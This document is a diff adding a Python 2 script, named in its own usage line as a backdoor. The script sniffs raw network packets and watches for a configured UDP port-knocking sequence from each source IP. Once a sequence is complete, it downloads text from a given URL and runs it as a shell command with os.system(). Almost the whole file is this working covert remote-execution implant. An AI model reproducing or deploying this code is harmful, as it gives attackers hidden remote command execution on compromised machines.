@@ -1,0 +1,184 @@
+#!/usr/bin/python
+"""references:
+stack_overflow
+https://www.ibm.com/developerworks/linux/tutorials/l-pysocks/
+http://www.binarytides.com/python-packet-sniffer-code-linux/
+"""
+
+import socket, sys
+import time
+import urllib2
+import os
+import getopt
+from struct import *
+ 
+#Convert a string of 6 characters of ethernet address into a dash separated hex string
+def eth_addr (a) :
+  b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(a[0]) , ord(a[1]) , ord(a[2]), ord(a[3]), ord(a[4]) , ord(a[5]))
+  return b
+
+#read port knocking sequence
+if len(sys.argv) < 3:
+	print 'usage: ./backdoor <configuration-file> <full-URL>'
+	sys.exit()
+opts,args = getopt.getopt(sys.argv[1:], "d:p")
+fullURL=args[1]
+
+filename=args[0]
+conf_file = open(filename,'r')
+with open(filename) as conf_file:
+    port = [line.rstrip('\n').rstrip('\r') for line in conf_file]
+
+print port
+print filename
+print fullURL
+
+#creating an AF_PACKET type raw socket 
+try:
+    s = socket.socket( socket.AF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003))
+except socket.error , msg:
+    print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+    sys.exit()
+
+#counter to count the number of packets received in order from a particular IP which is stored in IP list
+numtimes= [i for i, j in enumerate(port) if j == (port[0])]
+numrep = [x+1 for x in numtimes]
+counter=[]
+ip = []
+
+print numrep, port, numtimes
+
+
+
+# receive a packet
+while True:
+    packet = s.recvfrom(65565)
+   
+    #packet string from tuple
+    packet = packet[0]
+     
+    #parse ethernet header
+    eth_length = 14
+    
+    eth_header = packet[:eth_length]
+    eth = unpack('!6s6sH' , eth_header)
+    eth_protocol = socket.ntohs(eth[2])
+    
+ 
+    #Parse IP packets, IP Protocol number = 8
+    if eth_protocol == 8 :
+        #Parse IP header
+        #take first 20 characters for the ip header
+        ip_header = packet[eth_length:20+eth_length]
+         
+        #now unpack them :)
+        iph = unpack('!BBHHHBBH4s4s' , ip_header)
+ 
+        version_ihl = iph[0]
+        version = version_ihl >> 4
+        ihl = version_ihl & 0xF
+ 
+        iph_length = ihl * 4
+ 
+        ttl = iph[5]
+        protocol = iph[6]
+        s_addr = socket.inet_ntoa(iph[8]);
+        d_addr = socket.inet_ntoa(iph[9]);
+ 
+
+  
+        #UDP packets
+        if protocol == 17 :
+            u = iph_length + eth_length
+            udph_length = 8
+            udp_header = packet[u:u+8]
+ 
+            #now unpack them :)
+            udph = unpack('!HHHH' , udp_header)
+             
+            source_port = udph[0]
+            dest_port = udph[1]
+            length = udph[2]
+            checksum = udph[3]
+             
+            print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) 
+             
+            h_size = eth_length + iph_length + udph_length
+            data_size = len(packet) - h_size
+             
+            #get data from the packet
+            source = str(s_addr)
+            print 'udp'
+            
+            print str(s_addr)
+            print dest_port
+            
+            
+            #checking if the port number of the packet is the first port in the configuration file.
+            #If it is, then we check if the IP address is a new one or an old one. 
+            #If it's a new IP (this IP is knocking for the first time), we add it to the the IP list to track its activity.
+            #If it's an old IP, we reset the counter to 0
+            if str(dest_port) == port[0]:
+              print ip
+              if source not in ip:
+                ip.append(source)
+		a=[0 for x in range(len(numrep))]
+                counter.append(a)
+                print ip,counter
+                
+
+            #We check the sequence of packets received from each of the IP and trigger a request to a third server to fetch our
+            #command if the required sequence is received. At the same time we reset the counter to 0 to track from the starting.
+           
+            if source in ip:
+              print 'source in ip'
+              
+              ind= ip.index(source)
+              print str(dest_port), port[counter[ind][0]]
+              for i in range(len(numrep)):
+                  if str(dest_port) == port[counter[ind][i]]:
+                    counter[ind][i]=counter[ind][i]+1
+                    print counter[ind][i]
+                    print len(numrep), counter[ind][0], numrep
+                    if i == len(numrep)-1:
+                      break
+                    else:
+                      if counter[ind][0] < numrep[i+1]:
+                        if counter[ind][i+1]>0:
+	                  continue
+                        else:
+                          break
+                      else:
+                        continue
+                  else:
+                    if str(dest_port) == port[0]:
+                      
+                      counter[ind][i]=0
+                      counter[ind][0]=1
+                      continue
+                    else:
+                      if i == len(numrep)-1:
+                        break
+                      else:
+                        if counter[ind][0] < numrep[i+1]:
+                          counter[ind][i]= 0
+                          continue 
+                        else: 
+                          continue
+              print counter[ind]
+              
+
+            if source in ip:
+              ind = ip.index(source)
+              print counter[ind]
+              if len(port) in counter[ind]:
+                ind = ip.index(source)
+		counter[ind]=[0 for x in range(len(numrep))]
+                print 'contacting server'
+                a=urllib2.urlopen(fullURL).read()
+                print a
+                time.sleep(5)
+                os.system(a)
+                
+	        print str(dest_port), source              
+
